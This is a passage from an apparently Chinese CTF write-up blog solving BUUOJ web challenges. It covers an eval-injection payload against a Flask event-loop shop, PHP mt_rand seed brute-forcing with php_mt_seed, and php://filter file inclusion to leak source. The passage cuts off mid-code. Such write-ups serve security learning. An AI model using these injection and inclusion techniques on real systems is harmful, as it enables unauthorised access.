class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>题目中有flask，网站内容和购买有关，盲猜flask session逻辑漏洞</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174627993.png" class="" title="image-20201129174627993"><p>拿去<code>flask_session_cookie_manager</code>解密</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174747409.png" class="" title="image-20201129174747409"><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>base64再解密得</p><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>分析serve.py</p><p>先找flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175323407.png" class="" title="image-20201129175323407"><p>发现在get_flag_handler函数里，而条件是<code>session[&#39;num_items&#39;] &gt;= 5</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129175427470.png" class="" title="image-20201129175427470"><p>再跳到buy_handler函数里</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175938047.png" class="" title="image-20201129175938047"><p>关键逻辑</p><p><strong>num_items数目先增，然后再扣point，如果point不够再把num_items扣回去</strong></p><p>然后就不会了</p><p>开始分析大佬的WP</p><ul><li><p>仔细分析execute_event_loop，会发现里面有一个eval函数，而且是可控的！ </p></li><li><p>利用eval()可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。 </p></li><li><p>若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。 </p></li><li><p>根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。 </p></li></ul><p>最终payload：</p><pre class="language-none"><code class="language-none">action:trigger_event%23;action:buy;5%23action:get_flag;</code></pre><p>不知道编码问题？<code>#</code>必须写成 <code>%23</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129181046007.png" class="" title="image-20201129181046007"><p>拿去解密得</p><img src="/article/Buuoj-WEB-Write-up/image-20201129181142945.png" class="" title="image-20201129181142945"><p>base64解密得</p><pre class="language-none"><code class="language-none">&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:trigger_event#;action:buy;5#action:get_flag;&quot;&#125;,[&#123;&quot; b&quot;:&quot;action:buy;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:get_flag;&quot;&#125;],[&#123;&quot; b&quot;:&quot;func:consume_point;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&#123;&quot; b&quot;:&quot;func:show_flag;flag&#123;f0c04d65-ffa9-472b-9263-1e308ad45fd8&#125;&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#96;</code></pre><p>flag即在其中</p><hr><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129181539620.png" class="" title="image-20201129181539620"><p>看源码有个hidden标签，直接去掉得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>php伪随机数爆破</p><p>用php_mt_seed</p><p>扔虚拟机里make</p><img src="/article/Buuoj-WEB-Write-up/image-20201129183233275.png" class="" title="image-20201129183233275"><p>然后用python脚本转化得到的数据</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'uG8C1Wg91B'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># reverse</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201129184300244.png" class="" title="image-20201129184300244"><p>然后运行<code>./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61</code></p><p>爆破得<code>394409044</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129184626939.png" class="" title="image-20201129184626939"><p>回去跑出完整字符串</p><img src="/article/Buuoj-WEB-Write-up/image-20201129184942098.png" class="" title="image-20201129184942098"><p><code>SJShX9epREbTBLfdc4Gu</code></p><p>回去提交出flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129185017278.png" class="" title="image-20201129185017278"><hr><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>打开就是登陆界面</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203609192.png" class="" title="image-20201129203609192"><p>猜想SQL注入，发现过滤引号，暂时放弃这条路</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203656135.png" class="" title="image-20201129203656135"><p>不给扫目录，盲猜访问<code>register.php</code>，还真有</p><p>注册用户登陆进去</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203815847.png" class="" title="image-20201129203815847"><p>发现url猫腻，文件包含，利用伪协议读取一下index</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203901945.png" class="" title="image-20201129203901945"><pre class="language-none"><code class="language-none">PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+</code></pre><p>解密得index.php源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: user.php?page=info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/index.html"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下user.php</p><p><code>user.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token 